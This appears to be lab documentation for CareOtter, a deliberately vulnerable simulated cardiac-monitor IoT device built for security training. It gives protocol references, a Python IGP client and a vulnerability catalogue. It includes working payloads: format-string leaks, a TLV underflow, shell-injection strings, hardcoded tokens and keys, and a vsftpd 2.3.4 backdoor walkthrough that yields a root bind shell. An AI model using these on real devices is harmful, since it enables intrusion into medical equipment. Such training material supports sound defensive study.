# CareOtter — IoT Device Documentation

## Device Overview

CareOtter is a simulated embedded medical device designed for IoT security training. It represents a wearable cardiac monitor that measures heart rate (BPM) and blood oxygen saturation (SpO2) in real time and transmits readings to a companion mobile application and a cloud management API.

The device runs on a **Raspberry Pi 3B/4** under **OpenWRT v24.10.2** and exposes three distinct communication surfaces, each carrying intentional security weaknesses that mirror documented vulnerabilities found in real-world medical IoT devices.

### Hardware and Software Architecture

| Component | Technology |
|-----------|-----------|
| Platform | Raspberry Pi 3B/4 — OpenWRT 24.10.2 |
| Sensor simulator | Python 3 (`simulator.py`) — 10 Hz synthetic BPM/SpO2 |
| HTTP sensor service | Python (`sensor_service.py`) — port 8081 |
| BLE GATT server | Python + `dbus_fast` (`ble_server.py`) — BlueZ |
| Admin service | C binary (`careservice`) — port 9999 |
| Mobile app | Android (Java) — BLE + Cloud API |
| Cloud API | Flask (Docker) — nginx edge on port 80/5002 |

### Communication Surfaces

```
┌─────────────────────────────────────────────────────────┐
│                    CareOtter Device                     │
│                   (192.168.2.1)                         │
│                                                         │
│  ┌──────────────┐  ┌───────────────┐  ┌─────────────┐  │
│  │  BLE GATT    │  │  HTTP :8081   │  │  IGP :9999  │  │
│  │  ble_server  │  │ sensor_service│  │ careservice │  │
│  └──────┬───────┘  └───────┬───────┘  └──────┬──────┘  │
└─────────┼──────────────────┼─────────────────┼─────────┘
          │ BLE (GATT)       │ HTTP            │ TCP/IGP
          ▼                  ▼                 ▼
   Android App          Cloud API          Attacker /
  (direct vitals)      (proxy)           Admin Tool
```

### Services and Ports

| Port | Protocol | Service | Auth |
|------|----------|---------|------|
| 8081 | HTTP | `sensor_service.py` — vitals and health | None |
| 9999 | TCP binary (IGP v4) | `careservice` — device administration | Hardcoded token |
| 21 | FTP | `careotter-ftp` — field-service FTP (`vsftpd 2.3.4`) | None (backdoored) |
| BLE | GATT | `ble_server.py` — vitals + thresholds | None |

---

## Protocol Reference

### IGP v4 (IoT Gateway Protocol)

Binary protocol over TCP port 9999. All commands share the same 8-byte header:

```
 0       3  4     5  6     7
┌──────────┬───────┬───────┐
│  Magic   │  Cmd  │  Len  │
│ 0x43415245│      │(BE 16)│
│  "CARE"  │       │       │
└──────────┴───────┴───────┘
```

| Cmd | Name | Auth required | Description |
|-----|------|:---:|-------------|
| `0x01` | SYS_INFO | No | Kernel version and architecture |
| `0x02` | AUTHENTICATE | No | Submit admin token |
| `0x03` | GET_NETWORK | Yes | Returns `/etc/config/wireless` (PSK included) |
| `0x04` | SET_PREFS | Yes | Store UI preferences via TLV |
| `0x05` | VERIFY_STATUS | No | Named subsystem diagnostic |
| `0x06` | SET_WIFI | Yes | Change WiFi SSID/PSK via UCI |
| `0x07` | GET_VITALS | No | Current BPM/SpO2 from sensor service |
| `0x08` | SET_THRESHOLD | Yes | Update BPM/SpO2 alert thresholds |
| `0x09` | REBOOT_SERVICE | Yes | Restart an `init.d` service by name |
| `0x0A` | GET_LOG | Yes | Last 512 bytes of service log |
| `0x0B` | DEFIBRILLATE | Yes | Simulated defibrillator discharge (log event) |
| `0x0C` | EMERGENCY_ALERT  | Yes | Send alert via `curl` to configured endpoint |
| `0x0D` | DEAUTHENTICATE   | No  | Reset `authenticated=0` — session close |
| `0x0E` | GET_THRESHOLD    | No  | Read current clinical thresholds from file |
| `0x0F` | PING             | No  | Connectivity probe — returns `PONG` |
| `0x10` | GET_SIGNATURE    | Yes | Returns factory device signature for patient registration |

### CSCP v1 (CareOtter Secure Config Protocol)

Used over BLE GATT characteristic `0xFF01` to read and write alert thresholds. 24-byte packet:

```
[Magic 4B][CRC32 4B][AES-128-ECB ciphertext 16B]
```

Key hardcoded: `careotter-key-16`. CSCP_MAGIC: `0xCAFE0DDA`.

### Factory Provisioning Channel (BLE)

Hidden GATT service (`0xFF10`) used by clinical technicians to configure the bedside monitor during initial installation. The device ships **without a pre-configured Cloud API endpoint** — the technician must set both WiFi credentials and the Cloud URL via BLE before the monitor can communicate with the hospital backend. The service is **not advertised** in the BLE advertising packet — it only appears during GATT service discovery after connection.

**Manufacturer claim**: auto-disables 30 minutes after first power-on.  
**Reality** (`ble_server.py`): `initialized_at` is recorded but never checked against current time.

**GATT Service — `0000ff10-0000-1000-8000-00805f9b34fb`** (secondary, not advertised):

| Characteristic | UUID | Flags | Function |
|---|---|---|---|
| Provisioning Config | `0000ff11-…` | read, write, notify | JSON command interface |
| Provisioning Auth | `0000ff12-…` | read, write | 4-digit factory PIN |

**Commands (JSON write to `0xFF11`):**

| Command | Body | Action |
|---|---|---|
| `wifi_set` | `{"cmd":"wifi_set","ssid":"...","psk":"..."}` | UCI WiFi configuration |
| `wifi_get` | `{"cmd":"wifi_get"}` | Returns current WiFi state (via read) |
| `cloud_set` | `{"cmd":"cloud_set","url":"http://..."}` | Sets Cloud API endpoint |
| `cloud_get` | `{"cmd":"cloud_get"}` | Returns configured Cloud URL |
| `factory_reset` | `{"cmd":"factory_reset"}` | Wipes configuration |
| `reboot` | `{"cmd":"reboot"}` | Reboots monitor |

**Expected onboarding flow (clinical technician):**
1. Power on bedside monitor.
2. Connect to `CareOtter_HR` via BLE (no pairing required by design).
3. Discover services → find hidden `0xFF10`.
4. Write PIN `6767` to `0xFF12`.
5. Write `{"cmd":"wifi_set","ssid":"HospitalWiFi","psk":"..."}` to `0xFF11`.
6. Write `{"cmd":"cloud_set","url":"http://hospital-cloud.local:5002"}` to `0xFF11`.
7. Channel should auto-close after 30 min (but never does — **P8**).

**Vulnerabilities:**
- **P1** — Hidden but discoverable via service enumeration.
- **P2** — No BLE pairing/bonding required.
- **P3** — Hardcoded PIN `6767`, no rate limiting, no lockout.
- **P4** — `wifi_set` uses `system()` with unescaped SSID/PSK → shell injection.
- **P5** — `ReadValue` returns `wifi_psk` in plaintext.
- **P6** — `cloud_set` accepts arbitrary URLs → SSRF.
- **P7** — `factory_reset` executes on single write without confirmation.
- **P8** — Channel never auto-closes.

---

## CareService — Device Administration (IGP v4)

`careservice` is the C daemon that implements the device administration interface
over TCP `:9999`. It is the component with the largest attack surface in the lab: it exposes
12 binary commands, requires a hardcoded token for authentication, and contains four
exploitable vulnerabilities (format string, integer underflow, shell injection, command
injection).

### IGP Helper — Setup

Save as `igp_helper.py` on the attacker machine. All tests in this section
assume this helper is active:

```python
import socket, struct, sys

MAGIC = 0x43415245

def igp(cmd: int, payload: bytes = b'') -> bytes:
    hdr = struct.pack('>IBBH', MAGIC, cmd, 0, len(payload))
    with socket.create_connection(('192.168.2.1', 9999), timeout=5) as s:
        s.sendall(hdr + payload)
        return s.recv(4096)

if __name__ == '__main__':
    cmd = int(sys.argv[1], 0)
    payload = sys.argv[2].encode() if len(sys.argv) > 2 else b''
    print(igp(cmd, payload).decode('utf-8', errors='replace'))
```

Usage from command line:
```bash
python3 igp_helper.py 0x01
python3 igp_helper.py 0x02 "OtterMobile2026"
```

---

### Commands — Practical Reference

#### 0x01 SYS\_INFO (no authentication)

Returns the Linux kernel version and device architecture.

```python
print(igp(0x01))
# b'v:6.6.104|m:armv7l'
```

---

#### 0x02 AUTHENTICATE (no prior authentication required)

Authenticates the session with the hardcoded token. State persists in a process
global variable — it is not reset when the TCP connection closes (vuln #6).

```python
print(igp(0x02, b'OtterMobile2026'))   # b'AUTH_SUCCESS'
print(igp(0x02, b'WrongToken'))         # b'AUTH_FAIL'
```

> **Note:** Once any connection is authenticated, subsequent connections inherit the state
> until the process is restarted. See vulnerability IoT:I7.

---

#### 0x03 GET\_NETWORK (requires auth)

Returns the raw contents of `/etc/config/wireless`, including SSID and PSK in plaintext.

```python
igp(0x02, b'OtterMobile2026')
print(igp(0x03).decode())
# config wifi-iface 'default_radio0'
#     option ssid 'HomeNetwork'
#     option key  'mypassword123'
```

> **Vuln #2:** The WiFi PSK is exposed to any authenticated client.

---

#### 0x04 SET\_PREFS (requires auth)

Stores UI preferences via a TLV parser. **Contains an integer underflow
that leads to stack BOF** (vuln #3).

Normal TLV format:
```
0xAA [len] [visual theme name]   → e.g. AA 04 44 61 72 6B ("Dark")
0xAB [len] [language code]       → e.g. AB 02 65 73 ("es")
0xAC 01    [screen mode]         → 0x00=day, 0x01=night
```

```python
import struct

igp(0x02, b'OtterMobile2026')

# Normal use: theme "Dark", language "es", night mode
tlv  = b'\xAA\x04Dark'
tlv += b'\xAB\x02es'
tlv += b'\xAC\x01\x01'
print(igp(0x04, tlv))           # b'PREFS_SAVED'

# Exploit underflow: Len=0xFF with only 4 real bytes → crash/BOF
tlv_exploit = b'\xAA\xFF\x41\x41\x41\x41'
print(igp(0x04, tlv_exploit))   # anomalous behavior or segfault
```

---

#### 0x05 VERIFY\_STATUS (no authentication)

Subsystem diagnostic by name. **The payload is passed directly as a format
string to `snprintf`** (vuln #4). Does not require prior authentication.

```python
# Normal use
print(igp(0x05, b'CareOtter'))
# b'Status: CareOtter OK'

# Exploit format string: stack value leak
print(igp(0x05, b'%x.%x.%x.%x'))
# b'1f4.400.0.bffffea8...'
```

---

#### 0x06 SET\_WIFI (requires auth)

Configures SSID and PSK via UCI. **The SSID is interpolated into `system()` without escaping
shell metacharacters** (vuln #5).

Payload format: `"SSID|PSK"` (separated by `|`).

```python
igp(0x02, b'OtterMobile2026')

# Normal use
print(igp(0x06, b'MiRed|mipassword123'))
# b'WIFI_UPDATED'

# Exploit shell injection via SSID
print(igp(0x06, b"' && touch /tmp/pwned #|x"))
# Creates /tmp/pwned on the RPi as root
```

---

#### 0x07 GET\_VITALS (no authentication)

Proxy to `sensor_service.py` — returns the full HTTP response from `:8081/vitals`.

```python
print(igp(0x07))
# b'HTTP/1.0 200 OK\r\nContent-Type: application/json\r\n\r\n'
# b'{"bpm": 72, "spo2": 98, "red_raw": 61085, ...}'
```

---

#### 0x08 SET\_THRESHOLD (requires auth)

Updates the clinical BPM/SpO₂ alert thresholds and persists them to
`/var/log/careotter.thresholds`. `sensor_service.py` automatically reloads them within ≤5s.

TLV format:
```
BB 04 [bpm_min uint16 BE] [bpm_max uint16 BE]
CC 01 [spo2_min uint8]
```

```python
import struct

igp(0x02, b'OtterMobile2026')

# BPM 50–120, SpO₂ min 90%
tlv = struct.pack('>BBHH', 0xBB, 4, 50, 120) + struct.pack('>BBB', 0xCC, 1, 90)
print(igp(0x08, tlv))
# b'THRESHOLD_SET'

# Verify written file (on the RPi):
# cat /var/log/careotter.thresholds
# bpm_min=50
# bpm_max=120
# spo2_min=90
```

> **Note:** Propagation to `sensor_service.py` is verified in the
> [Test Scenarios](#test-scenarios--clinical-threshold-synchronization)
> below.

---

#### 0x09 REBOOT\_SERVICE (requires auth)

Restarts an init.d service by name. **Does not call `waitpid()` after fork —
accumulates zombie processes** (vuln IoT:I8).

```python
igp(0x02, b'OtterMobile2026')

print(igp(0x09, b'medical-sensor'))   # b'SVC_RESTART_QUEUED'
print(igp(0x09, b'careservice'))       # b'SVC_RESTART_QUEUED'
print(igp(0x09, b'ble-server'))        # b'SVC_RESTART_QUEUED'

# Unrecognized service:
print(igp(0x09, b'sshd'))             # b'REBOOT_ERR'
```

---

#### 0x0A GET\_LOG (requires auth)

Returns the last 512 bytes of the careservice log in `/var/log/careservice.log`.

```python
igp(0x02, b'OtterMobile2026')
print(igp(0x0A))
# b'[careservice] Started on port 9999\n...' or b'LOG_EMPTY'
```

---

#### 0x0B DEFIBRILLATE (requires auth)

Simulates a 200 J defibrillator discharge and logs the event to
`/opt/careotter_events.log`. **The payload is used as a format string in the therapy
log** (vuln #11).

```python
igp(0x02, b'OtterMobile2026')

# Normal use
print(igp(0x0B, b'test_event'))
# b'DEFIB_TRIGGERED:200J:1746000000'

# Exploit format string in therapy log
print(igp(0x0B, b'%x.%x.%x.%x'))
# Response: b'DEFIB_TRIGGERED:200J:...'
# /opt/careotter_events.log contains stack values
```

---

#### 0x0C EMERGENCY\_ALERT (requires auth)

Sends an alert to the endpoint configured in `/etc/careotter/alert.conf` via `curl`.
**The message is concatenated without escaping in the shell command** (vuln #12).

```python
igp(0x02, b'OtterMobile2026')

# Normal use
print(igp(0x0C, b'SpO2 below threshold'))
# b'ALERT_SENT:SpO2 below threshold'

# Exploit command injection
print(igp(0x0C, b"normal'; touch /tmp/alert_pwned #"))
# Creates /tmp/alert_pwned on the RPi as root
```

---

#### 0x0D DEAUTHENTICATE (no authentication required)

Resets the global `authenticated` flag to `0`, closing the admin session.
Called by the Cloud API after every protected operation to minimize the window
during which `authenticated=1` is exploitable by direct TCP clients.

```python
# Normal use: close session after a protected command
igp(0x02, b'OtterMobile2026')   # AUTH_SUCCESS
igp(0x03)                        # GET_NETWORK (returns WiFi PSK)
print(igp(0x0D))                 # b'DEAUTH_OK'

# Verify de-auth: next protected command should be rejected
print(igp(0x03))                 # b'RESTRICTED'
```

> **Security note:** `0x0D` does not require prior authentication and cannot
> be used to "lock out" a legitimate session mid-execution. It only resets
> the flag — the race window between the command connection and this connection
> still exists for direct TCP attackers.

---

#### 0x10 GET_SIGNATURE (requires authentication)

Returns the hardcoded factory device signature: **12 hexadecimal characters**
(e.g. `9C0C306DEF2A`). This value is what the installer/administrator must hand
to the patient so they can register the device in the Cloud API via
`POST /api/devices/register-by-hash`.

```python
igp(0x02, b'OtterMobile2026')   # AUTH_SUCCESS
print(igp(0x10))                 # b'9C0C306DEF2A'
```

> **Format change (2026-05-20):** The previous wire format was
> `CareOtter<hex>` (e.g. `9C0C306DEF2A`, 21 chars). The prefix was
> constant for every device and added zero entropy, so it was dropped from
> the device label, from `careservice.c::DEVICE_SIGNATURE`, from the Pi's
> `config.json::device_hash`, and from the cloud's `EXPECTED_DEVICE_SIGNATURE`.
> The cloud still accepts the legacy prefixed form transparently via
> `DatabaseService.canonical_hash` for backward compatibility.

> **Security note:** This endpoint requires authentication, but the signature is
> identical across all CareOtter devices. An attacker who captures it can register
> a rogue device or replay it to a fake cloud. The cloud-side
> `/api/devices/register-by-hash` is now hardened with format guard, per-user
> rate limiting (5 / 15 min), `hmac.compare_digest`, and audit logging — see
> `docs/CareOtter/API/CareOtter_API.md` for the full contract.

---

### Test Scenarios — Clinical Threshold Synchronization

These scenarios verify that thresholds configured via IGP `0x08 SET_THRESHOLD`
propagate correctly to `sensor_service.py`, which uses them in `/alerts` and in the
clinical alert logic of the lab.

#### Scenario A — Automatic Polling ✅ VERIFIED

The watcher in `sensor_service.py` detects changes in `/var/log/careotter.thresholds` by
mtime within ≤5 seconds, with no additional signals or service restart.

**Prerequisites:**
```bash
curl -s http://192.168.2.1:8081/health   # → {"status":"ok",...}
nc -zv 192.168.2.1 9999                  # → Connected
```

**1. Read base threshold:**
```bash
curl -s http://192.168.2.1:8081/alerts | python3 -m json.tool
# "thresholds": {"bpm_min": 40, "bpm_max": 120, "spo2_min": 90}
```

**2. Set `bpm_max=60` to force alert (simulated BPM ~72 > 60):**
```python
import struct

igp(0x02, b'OtterMobile2026')
tlv = struct.pack('>BBHH', 0xBB, 4, 50, 60) + struct.pack('>BBB', 0xCC, 1, 95)
print(igp(0x08, tlv))   # THRESHOLD_SET
```

**3. Verify file written on the RPi:**
```bash
ssh root@192.168.2.1 'cat /var/log/careotter.thresholds'
# bpm_min=50
# bpm_max=60
# spo2_min=95
```

**4. Wait ≤5s and verify propagation:**
```bash
sleep 6
curl -s http://192.168.2.1:8081/alerts | python3 -m json.tool
# EXPECTED RESULT:
# "thresholds": {"bpm_min": 50, "bpm_max": 60, "spo2_min": 95}
# "bpm_high": true   ← simulated BPM ~72 exceeds bpm_max=60
```

> ✅ **Status:** Verified. Synchronization works correctly within ≤5s after
careservice writes the file. The watcher detects the mtime change and applies the
new thresholds without manual intervention.

---

#### Scenario B — Manual SIGHUP ⏳ Pending test

Verifies that the SIGHUP handler in `sensor_service.py` reloads the file
immediately without waiting for the 5s polling cycle.

```bash
# 1. Write thresholds directly on the RPi
ssh root@192.168.2.1 'printf "bpm_min=25\nbpm_max=55\nspo2_min=98\n" > /var/log/careotter.thresholds'

# 2. Send SIGHUP — instant reload
ssh root@192.168.2.1 'kill -HUP $(pgrep -f sensor_service.py)'

# 3. Verify without sleep (reload should be immediate)
curl -s http://192.168.2.1:8081/alerts | python3 -m json.tool
# EXPECTED: "thresholds": {"bpm_min": 25, "bpm_max": 55, "spo2_min": 98}
```

> ⏳ **Status:** Pending test on physical device.

---

#### Scenario C — Load at boot ⏳ Pending test

Verifies that if `/var/log/careotter.thresholds` exists before `sensor_service.py`
starts, the thresholds are loaded directly from the file instead of using the
in-memory defaults (`bpm_min=40, bpm_max=120, spo2_min=90`).

```bash
# 1. Pre-write the file BEFORE starting the service
ssh root@192.168.2.1 'printf "bpm_min=45\nbpm_max=80\nspo2_min=92\n" > /var/log/careotter.thresholds'

# 2. Restart sensor_service
ssh root@192.168.2.1 '/etc/init.d/medical-sensor restart'

# 3. Verify active thresholds right after startup (no IGP 0x08 at all)
sleep 2
curl -s http://192.168.2.1:8081/alerts | python3 -m json.tool
# EXPECTED: "thresholds": {"bpm_min": 45, "bpm_max": 80, "spo2_min": 92}
# The defaults (40/120/90) were never used: the file overwrote them at startup
```

> ⏳ **Status:** Pending test on physical device.

---

## Push Architecture & Cron Hardening

> **Changed:** 2026-05-20 — inverted the data direction so the device is the
> initiator. Documented here for operators who diagnose data flow.

### Direction of Traffic

```
                       cloud_uploader.py (Pi cron, every 60s)
                       loops internally every 10s for the full minute
                                       │
                                       ▼
sensor_service.py ── /vitals  ─►  cloud_uploader  ── POST /api/device/vitals ─►  Cloud (SQLite)
(127.0.0.1:8081)    loopback           │           HTTPS plaintext over WiFi
                                       └────────── POST /api/device/alerts  ─►  Cloud (SQLite)
```

The Cloud no longer polls the Pi. The only request the cloud still issues to
the Pi is a periodic `/health` for MAC/WiFi-IP resolution
(`app.py::_fetch_device_mac` background thread, 60s interval).

### `cloud_uploader.py` Contract

`labs/careotter/files/opt/medical-sensor/cloud_uploader.py` runs as a
60-second cron job. Inside each run it loops 6 × 10s, so the cloud receives a
fresh row every 10s without the Pi keeping a long-running daemon (cheaper on
the BCM2837 + simpler to restart on failure).

Each iteration:

1. `_sensor_get("/vitals", api_key)` — GET loopback HTTP on `127.0.0.1:8081`.
2. `_sensor_get("/alerts/history?since=<watermark>", api_key)` — only events
   newer than `/tmp/careotter_alert_watermark`.
3. POST both to `{cloud_endpoint}/api/device/vitals` and `…/alerts` with
   headers `X-Device-MAC` (eth0 MAC) + `X-Device-Hash` (12-hex factory code).
4. On success, advance the alert watermark to the newest sent timestamp.

Configuration source: `/opt/medical-sensor/config.json::cloud_endpoint`. The
script appends `/api/device/...` itself — do NOT include that suffix in
`cloud_endpoint`. Valid examples:

```json
"cloud_endpoint" : "http://192.168.2.2:5002"     // PC over Ethernet
"cloud_endpoint" : "http://192.168.1.50:5002"    // PC over WiFi
```

### Cron Hardening — `60-cron.sh`

Busybox crond on OpenWRT has two silent failure modes that hit us during
the 2026-05-19 lab session:

1. **`cronloglevel` defaults to 8** → only daemon start/stop appears in
   `logread`, dispatch lines (`USER root pid X cmd Y`) are suppressed.
   Indistinguishable from "cron not firing" without instrumentation.
2. **Wrong file ownership/mode on `/etc/crontabs/root`** → busybox crond
   *silently ignores* crontabs not owned by root or that are
   group/other-writable. SCP-ing the overlay from a dev box leaves the file
   as uid 1000:1000 mode 0664 → zero jobs ever fire, no log line.

`labs/careotter/files/usr/lib/vulnzoo-hooks/profile-init.d/60-cron.sh` now
normalises both at every device profile load:

```sh
uci set system.@system[0].cronloglevel='0'
uci commit system

chown root:root /etc/crontabs/root
chmod 600       /etc/crontabs/root

/etc/init.d/cron enable && /etc/init.d/cron restart
```

After this, every job dispatch shows up in `logread`:

```
cron.info crond[…]: USER root pid X cmd /usr/bin/env python3 /opt/medical-sensor/cloud_uploader.py >/dev/null 2>&1
```

### Cloud-Authoritative Timestamps (RPi has no RTC)

The Raspberry Pi 3B+ has no battery-backed clock. After a cold boot it
returns whatever epoch its filesystem was last updated with (often days or
weeks in the past) until NTP kicks in. The Pi `cloud_uploader` sends rows
tagged with `time.time()` from the Pi → if the Pi clock is 26h behind, every
row falls outside the Cloud's "last 24h" filter and the dashboard shows
empty graphs.

Fixed in `app.py::device_push_vitals` and `device_push_alerts`:

```python
# Cloud clock is authoritative — overwrite the Pi-supplied timestamp.
data['timestamp'] = time.time()
db.store_vitals(data, device_mac=mac)

# Same for alerts:
now_ts = time.time()
for event in data.get('alerts', []):
    event['timestamp'] = now_ts
    db.store_alert(event, device_mac=mac)
```

Loses real measurement precision (≤10s scatter due to push cadence) in
exchange for graphs that always render. If sub-10s precision matters
clinically, replace with NTP sync on the Pi instead.

### Placeholder-MAC Adoption

`initialize_iot` seeds the Pi's row at lab boot. If `/health` is unreachable
at seed time, the MAC is stored as `00:00:00:00:00:00`. On the Pi's first
real push, `device_push_vitals` looks up by `X-Device-MAC` → 404, then
falls back to lookup by `X-Device-Hash`. If a placeholder row matches,
`DatabaseService.adopt_mac_for_signature` atomically rewrites that row's MAC
in-place so subsequent pushes take the fast path:

```python
device = db.get_device_by_mac(mac)
if not device:
    if db.adopt_mac_for_signature(auth_hash, mac):
        device = db.get_device_by_mac(mac)
```

This makes the order of operations (cloud seed vs Pi first boot)
irrelevant.

### Verification Recipes

```sh
# Cron is firing
ssh root@192.168.2.1 'logread | grep "cmd /usr/bin/env python3"'

# Outbound POSTs leaving the Pi
ssh root@192.168.2.1 'tcpdump -i any -nn "tcp port 5002" -c 4'

# Manual single run (skip the wait for cron)
ssh root@192.168.2.1 'python3 /opt/medical-sensor/cloud_uploader.py'
# expect: [Uploader] Vitals pushed → 200

# Cloud-side ingest visible
docker logs careotter-api 2>&1 | grep -E 'POST /api/device/(vitals|alerts)' | tail -5

# Rows landing with current timestamp
docker exec careotter-api sqlite3 /app/data/careotter.db \
  "SELECT datetime(timestamp,'unixepoch'), device_mac, bpm, spo2
     FROM vitals_readings ORDER BY id DESC LIMIT 5;"
```

---

## CareOtter-FTP — Field-Service FTP Daemon (port 21)

A legacy "field-service" FTP daemon (`/opt/careotter-ftp/careotter-ftp`, source `labs/careotter/careotter-ftp.c`) listens on `0.0.0.0:21`, modelling the firmware/log-transfer FTP that real medical devices ship and leave enabled in the field. It runs as **root**, is started by the `72-careotter-ftp.sh` hook under procd (`START=72`), and is independent from `careservice` (`:9999`) and the sensor service (`:8081`). The firewall hook (`75-firewall.sh`) already opens `:21` from the WAN side.

### Control channel

The daemon implements just enough of FTP for version fingerprinting and the backdoor trigger (not a full RFC-959 server). It greets with the legacy banner and answers a handful of commands:

| Command | Response | Notes |
|---------|----------|-------|
| (connect) | `220 (vsFTPd 2.3.4)` | the version banner — the lure picked up by `nmap -sV` |
| `USER <arg>` | `331 Please specify the password.` | if `<arg>` contains `:)` it triggers the backdoor (see below) |
| `PASS <arg>` | `230 Login successful.` | any password is accepted — there is no real authentication |
| `SYST` | `215 UNIX Type: L8` | static system-type reply |
| `FEAT` | `211 No features.` | |
| `QUIT` | `221 Goodbye.` | closes the control connection |

One process is forked per control connection. Activity is logged to `/tmp/careotter-ftp.log`.

### Backdoor mechanism (vsftpd 2.3.4 / CVE-2011-2523)

The daemon reproduces the historical vsftpd 2.3.4 backdoor. When a `USER` argument contains the smiley `:)`, it forks a child that binds `/bin/sh` to TCP `:6200` and serves one shell on the next connection. Because the daemon runs as root, that shell is **root**. The control conversation continues normally, so the trigger is invisible on the FTP side — the attacker simply connects to `:6200` afterwards. This mirrors the original `vsf_sysutil_extra()` and is a faithful re-implementation for training, not the upstream vsftpd source, the same way `careservice` reproduces its own CVEs.

```
$ nc <pi> 21
220 (vsFTPd 2.3.4)
USER pwn:)
331 Please specify the password.
# then, from another terminal:
$ nc <pi> 6200
id   ->  uid=0(root)
```

### Secure / vulnerable toggle

The service follows the careotter secure/vulnerable convention. The init script reads UCI `careotter.@careotter[0].ftp_secure` and exports it as `CAREOTTER_FTP_SECURE` (default `0` = vulnerable).

- **`0` (vulnerable):** the daemon starts, the banner is `vsFTPd 2.3.4`, the `:)` backdoor is active.
- **`1` (secure):** the init script does not start the daemon at all — the I2 remediation is to decommission the unnecessary legacy service, so nothing listens on `:21`. The binary also disables the backdoor if it is launched directly, as defense-in-depth.

### Lifecycle and build

The service is procd-managed via `/etc/init.d/careotter-ftp` (`START=72`, `USE_PROCD=1`), with the boot symlink `/etc/rc.d/S72careotter-ftp` self-healed by `boot()`/`enable`. The binary is built from `careotter-ftp.c` with the OpenWRT 24.10.x aarch64 musl SDK (static, the same toolchain as `careservice`) and is **not stripped**, so `nmap -sV` and `strings(1)` reveal the `vsFTPd 2.3.4` version string.

The full exploit walk-through, CWE mapping and remediation live in the vulnerability doc `docs/CareOtter/Vulns/IoT/IoT2_Insecure_Network_Services.md` (§2.3).

---

## Vulnerabilities

### IoT:I1 — Weak, Guessable, or Hardcoded Credentials

#### 1.1 Hardcoded admin token in `careservice` binary

The `careservice` C daemon authenticates clients via a token comparison against a compile-time constant:

```c
#define ADMIN_TOKEN "OtterMobile2026"
```

The token is visible in plaintext by running `strings` on the binary:

```bash
$ strings /opt/careservice/careservice | grep Otter
OtterMobile2026
```

Any network-reachable client can authenticate to the IGP service without any additional credential. This matches the pattern of hardcoded credentials found in many embedded device administration interfaces.

**Exploitation:**

```python
import socket, struct

MAGIC = 0x43415245

def igp(ip, cmd, payload=b''):
    hdr = struct.pack('>IBBH', MAGIC, cmd, 0, len(payload))
    with socket.create_connection((ip, 9999), timeout=5) as s:
        s.sendall(hdr + payload)
        return s.recv(4096)

print(igp('192.168.2.1', 0x02, b'OtterMobile2026'))
# b'AUTH_SUCCESS'
```

**References:** OWASP IoT Top 10 — I1 · CWE-798

---

#### 1.2 Hardcoded AES key in BLE CSCP protocol

The BLE threshold characteristic uses AES-128-ECB with a key hardcoded in both the firmware and the Android APK:

```python
CSCP_KEY = b"careotter-key-16"   # ble_server.py:436
```

An attacker who extracts the key via static analysis of either the firmware or the decompiled APK can forge valid CSCP v1 packets and overwrite alert thresholds without any authentication handshake.

**References:** OWASP Mobile M1 — Improper Credential Usage · CWE-321

---

### IoT:I2 — Insecure Network Services

#### 2.1 IGP service with no transport encryption

The administration service listens on TCP port 9999 with no TLS. All commands, including the authentication token and the full WiFi configuration (SSID + PSK), are transmitted in cleartext over the Ethernet link.

```bash
$ nmap -p 9999 192.168.2.1
PORT     STATE SERVICE
9999/tcp open  unknown
```

A passive observer on the `192.168.2.0/24` segment can capture the admin token and the WiFi PSK with a single `tcpdump` session.

#### 2.2 HTTP sensor service is API-key gated, and the threshold bypass is the Cloud API BFLA

Port 8081 requires an `X-API-Key` header on every endpoint except `/health` (`sensor_service.py` `_check_auth`), so a direct unauthenticated POST is rejected:

```bash
$ curl -s -X POST http://192.168.2.1:8081/thresholds \
    -H "Content-Type: application/json" \
    -d '{"bpm_min": 0, "bpm_max": 255, "spo2_min": 0}'
{"error": "unauthorized", "X-API-Key": "invalid"}
```

The alarm-silencing threshold change is not a direct device call. It is reached one layer up, through the Cloud API `POST /api/config/thresholds`, which is guarded by the wrong decorator (`@token_required` instead of `@admin_required`), so a patient JWT is accepted (Broken Function Level Authorization, see API5). The Cloud API then proxies the change to the device over IGP `0x08`. Full analysis in `docs/CareOtter/Vulns/IoT/IoT2_Insecure_Network_Services.md` §2.2.

**References:** OWASP IoT Top 10 · I2 · CWE-306 · API5 (BFLA)

---

### IoT:I3 — Insecure Ecosystem Interfaces

> **Re-classified and migrated to `Vulns/`.** This section originally held four BLE-surface cases (§3.1–§3.4) plus Chain F. They have been split into per-vulnerability Layer-3 docs and re-classified: OWASP I3 targets interfaces *outside* the device (web, backend API, cloud, mobile), whereas every case here is a service on the device's own BLE radio, so the honest homes are I6, I7 and I2.

- **§3.1 BLE ManufacturerData leaks the Cloud API address** and **§3.2 Device Information GATT leaks the software stack** → [`../Vulns/IoT/IoT6_Insufficient_Privacy_Protection.md`](../Vulns/IoT/IoT6_Insufficient_Privacy_Protection.md) (the device disclosing information over its own interface, CWE-200).
- **§3.3 CSCP v1 threshold forging → deferred ZeroDivisionError DoS** → [`../Vulns/IoT/IoT7_Insecure_Data_Transfer_and_Storage.md`](../Vulns/IoT/IoT7_Insecure_Data_Transfer_and_Storage.md) (clinical thresholds under a hard-coded fleet-wide AES-ECB key, CWE-321).
- **§3.4 Factory Provisioning Channel (hidden administrative backdoor)** and **Chain F (Cloud API impersonation)** → [`../Vulns/IoT/IoT2_Insecure_Network_Services.md`](../Vulns/IoT/IoT2_Insecure_Network_Services.md) §2.4 (a hidden, unauthenticated device service with root RCE, CWE-912 — the BLE twin of the §IoT:I2 vsftpd backdoor, the `cloud_set` SSRF/impersonation being the only genuinely outside-the-device facet).

> Note: the `### IoT:I6` and `### IoT:I7` sections later in this document are *different* cases (WiFi-PSK disclosure via IGP, and careservice cross-connection auth state) and are unaffected by this migration.

> **The genuine I3 cases now have a home.** Moving the BLE-surface cases out left I3 describing the wrong layer. The honest outside-the-device interfaces (the Cloud API, its web UI and the nginx edge) are now documented in [`../Vulns/IoT/IoT3_Insecure_Ecosystem_Interfaces.md`](../Vulns/IoT/IoT3_Insecure_Ecosystem_Interfaces.md). That doc owns the forged device-telemetry ingest case (the Cloud API accepts pushes authenticated only by a spoofable static factory-signature header over plaintext HTTP) and cross-references the cloud/web/mobile cases that reach the device — BFLA device control, factory-signature replay, device-secret disclosure, the edge ACL bypass, the weak JWT key, the forgotten beta vhost, and the companion app's rogue-device MITM from missing peer authentication. The device end of the BLE link migrated to on-device buckets, the cloud and the mobile app are I3.

### IoT:I4 — Lack of Secure Update Mechanism

